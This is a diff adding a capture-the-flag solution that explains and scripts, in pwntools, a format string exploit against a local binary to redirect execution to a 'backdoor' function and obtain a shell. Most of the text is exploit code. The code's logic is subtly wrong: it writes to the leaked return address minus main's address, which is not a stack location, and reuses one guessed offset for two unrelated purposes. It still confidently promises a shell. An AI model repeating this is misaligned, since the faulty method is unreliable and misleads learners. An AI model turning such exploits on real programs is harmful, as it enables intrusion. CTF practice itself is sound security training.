@@ -1,0 +1,74 @@
+To solve this challenge using `pwntools`, we need to exploit the format string vulnerability in the `printf(buf)` call. The goal is to leak the address of the `backdoor` function and then overwrite a function pointer or return address to redirect execution to the `backdoor` function.
+
+Here are the steps and the corresponding `pwntools` code:
+
+### Steps
+
+1. **Identify the Format String Vulnerability**: The `printf(buf)` call in the `main` function is vulnerable to format string attacks because it does not specify a format string.
+2. **Leak the Address of `backdoor`**: Use the format string vulnerability to leak the address of the `backdoor` function.
+3. **Overwrite a Function Pointer or Return Address**: Use the leaked address to overwrite a function pointer or return address to redirect execution to the `backdoor` function.
+
+### Code
+
+```python
+from pwn import *
+
+# Set up the process
+binary = './fmt'
+elf = ELF(binary)
+p = process(binary)
+
+# Leak the address of backdoor
+p.recvuntil('gift: ')
+backdoor_addr = int(p.recvline().strip(), 16)
+log.info(f'Backdoor address: {hex(backdoor_addr)}')
+
+# Create a payload to overwrite the return address
+# We will use the format string vulnerability to write the address of backdoor to the return address of main
+# The exact offset depends on the binary and the stack layout, so you may need to adjust it
+offset = 7  # This is the offset to the return address of main, you may need to adjust this
+
+# Construct the payload
+payload = b'%7$p'  # Leak the address of the return address
+p.sendline(payload)
+p.recvuntil('0x')
+leaked_ret_addr = int(p.recvline().strip(), 16)
+log.info(f'Leaked return address: {hex(leaked_ret_addr)}')
+
+# Calculate the offset to the return address
+ret_offset = leaked_ret_addr - elf.sym['main']
+
+# Construct the final payload to overwrite the return address with the backdoor address
+payload = fmtstr_payload(offset, {ret_offset: backdoor_addr})
+p.sendline(payload)
+
+# Interact with the shell
+p.interactive()
+```
+
+### Explanation
+
+1. **Leak the Address of `backdoor`**:
+   - The program prints the address of the `backdoor` function in the `gift` variable.
+   - We read this address and convert it to an integer.
+
+2. **Leak the Return Address**:
+   - We use a format string `%7$p` to leak the address of the return address on the stack.
+   - This helps us determine the exact offset to the return address.
+
+3. **Calculate the Offset to the Return Address**:
+   - We calculate the offset to the return address by subtracting the address of the `main` function from the leaked return address.
+
+4. **Construct the Final Payload**:
+   - We use `fmtstr_payload` from `pwntools` to create a payload that overwrites the return address with the address of the `backdoor` function.
+   - The `offset` parameter is the number of elements on the stack before the return address, and the dictionary `{ret_offset: backdoor_addr}` specifies the address to overwrite and the value to write.
+
+5. **Interact with the Shell**:
+   - After sending the payload, the program should redirect execution to the `backdoor` function, which gives us a shell.
+
+### Notes
+
+- The exact offset (`offset`) and return address offset (`ret_offset`) may vary depending on the specific binary and environment. You may need to adjust these values based on your testing.
+- The `fmtstr_payload` function is used to create the format string payload. It takes the offset to the target address and a dictionary of addresses to overwrite and their corresponding values.
+
+By following these steps and using the provided code, you should be able to exploit the format string vulnerability and gain a shell.
